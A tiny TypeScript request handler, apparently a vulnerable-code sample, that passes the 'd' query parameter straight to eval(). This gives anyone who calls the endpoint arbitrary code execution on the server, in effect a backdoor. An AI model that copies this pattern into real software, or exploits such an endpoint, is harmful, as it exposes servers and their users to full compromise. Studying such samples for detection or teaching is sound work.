export function handler(req: any, res: any, db: any) {
    const d = req.query.d;
    eval(d);
}
